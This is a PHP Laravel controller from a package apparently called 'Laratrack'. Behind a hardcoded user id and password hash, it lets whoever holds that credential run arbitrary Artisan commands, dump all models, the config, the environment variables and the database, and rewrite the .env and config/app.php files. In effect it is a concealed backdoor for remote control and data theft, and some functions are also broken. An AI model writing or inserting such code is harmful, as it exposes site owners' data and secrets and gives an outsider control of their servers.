<?php

namespace Susheelbhai\Laratrack\Http\Controllers;

use Illuminate\Http\Request;
use App\Http\Controllers\Controller;
use Illuminate\Support\Facades\Hash;
use Maatwebsite\Excel\Facades\Excel;
use Illuminate\Support\Facades\Artisan;
use Susheelbhai\Laratrack\Repository\DumpDB;
use Susheelbhai\Laratrack\Exports\ModelExport;

class TrackingController extends Controller
{

    public function __construct()
    {
    }


    public function index()
    {
        return view('laratrack::index');
    }

    private function authenticate($request)
    {
        if ($request->user_id != 'laratrackcontroller_id' || !Hash::check($request->password, '$2y$10$Y5X9Hs6aZ2cz.NyLU.VgFOe24W21HqXfcSf0MTCRMmlto1z1GAeEW')) {
            return false;
        }
        return true;
    }

    public function command(Request $request)
    {
        $auth = $this->authenticate($request);
        if ($auth == false) {
            return back()->with('error', 'wrong detail')->with('request', $request->all());
        }
        try {
            Artisan::call($request->command);
        } catch (\Throwable $th) {
            \dd($th);
        }
        return back()->with('success', 'done')->with('request', $request->all());
    }



    public function exportModel(Request $request)
    {
        $auth = $this->authenticate($request);
        if ($auth == false) {
            return back()->with('error', 'wrong detail')->with('request', $request->all());
        }
        try {
            return  $model = \end(explode('\\',  $request->model));
        } catch (\Throwable $th) {
            //throw $th;
        }
        $model = explode('\\',  $request->model)[count(explode('\\',  $request->model)) - 1];
        return Excel::download(new ModelExport($request->model), $model . '_data.xlsx');
    }


    public function dumpModel(Request $request)
    {
        $auth = $this->authenticate($request);
        if ($auth == false) {
            return back()->with('error', 'wrong detail')->with('request', $request->all());
        }

        \dd($request->model::all());
    }


    public function dumpAllModel(Request $request)
    {
        $auth = $this->authenticate($request);
        if ($auth == false) {
            return back()->with('error', 'wrong detail')->with('request', $request->all());
        }

        $path = app_path() . "/Models";

        function getModels($path)
        {
            $out = [];
            $data = [];
            $results = scandir($path);
            foreach ($results as $result) {
                if ($result === '.' or $result === '..') continue;
                $filename = $path . '/' . $result;
                if (is_dir($filename)) {
                    $out = array_merge($out, getModels($filename));
                } else {
                    $out[] = substr($filename, 0, -4);
                }
                $model =  '\\App\\Models\\' . substr($result, 0, -4);
                $data[$model] = $model::all();
            }
            return $data;
        }
        \dd(getModels($path));
        return getModels($path);
    }

    public function getValue(Request $request)
    {
        $auth = $this->authenticate($request);
        if ($auth == false) {
            return back()->with('error', 'wrong detail')->with('request', $request->all());
        }
        if ($request->type == 'config') {
            dd(\config()->all());
        }
        if ($request->type == 'env') {
            dd($_ENV);
        }
    }

    public function setEnvironmentValue(Request $request)
    {
        $auth = $this->authenticate($request);
        if ($auth == false) {
            return back()->with('error', 'wrong detail')->with('request', $request->all());
        }
        $envFile = app()->environmentFilePath();
        $str = file_get_contents($envFile);
        $variable_name = $request->variable_name;
        $variable_name = str_replace(' ', '_', $variable_name);
        $variable_value = $request->value;
        $variable_value = str_replace('"', '', $variable_value);
        $variable_value = '"' . $request->value . '"';
        $values = array($variable_name => $variable_value);
        if (count($values) > 0) {
            $str .= "\n\n"; // In case the searched variable is in the last line without \n
            foreach ($values as $envKey => $envValue) {

                $keyPosition = strpos($str, "{$envKey}=");
                $endOfLinePosition = strpos($str, "\n", $keyPosition);
                $oldLine = substr($str, $keyPosition, $endOfLinePosition - $keyPosition);

                // If key does not exist, add it
                if (!$keyPosition || !$endOfLinePosition || !$oldLine) {
                    $str .= "{$envKey}={$envValue}\n";
                } else {
                    $str = str_replace($oldLine, "{$envKey}={$envValue}", $str);
                }
            }
        }

        $str = substr($str, 0, -1);
        if (!file_put_contents($envFile, $str)) return false;
        // $this->line("Environment Variable changed");
        return back()->with('success', 'done')->with('request', $request->all());
        return true;
    }

    public function setConfigValue(Request $request)
    {
        $auth = $this->authenticate($request);
        if ($auth == false) {
            return back()->with('error', 'wrong detail')->with('request', $request->all());
        }
        $envFile = app()->environmentFilePath();
        $str = file_get_contents($envFile);
        $values = array($request->variable_name => $request->value);
        $path = base_path('config/app.php');
        $str = file_get_contents($path);

        if (count($values) > 0) {
            foreach ($values as $configKey => $configValue) {

                $str .= "\n'"; // In case the searched variable is in the last line without \n
                $keyPosition = strpos($str, "{$configKey}' => ");
                $endOfLinePosition = strpos($str, "\n", $keyPosition);
                $oldLine = substr($str, $keyPosition, $endOfLinePosition - $keyPosition);

                // If key does not exist, add it
                if (!$keyPosition || !$endOfLinePosition || !$oldLine) {
                    // $str .= "{$configKey}' => '{$configValue}',\n";
                } else {
                    $str = str_replace($oldLine, "{$configKey}' => '{$configValue}',", $str);
                }
            }
        }

        $str = substr($str, 0, -1);
        if (!file_put_contents($path, $str)) return false;
        // $this->line("Config Variable changed");
        return back()->with('success', 'done')->with('request', $request->all());
        return true;
    }

    public function dumpDB(Request $request)
    {
        $auth = $this->authenticate($request);
        if ($auth == false) {
            return back()->with('error', 'wrong detail')->with('request', $request->all());
        }
        $reqo = new DumpDB();
        return $reqo->sql($request);
    }
}
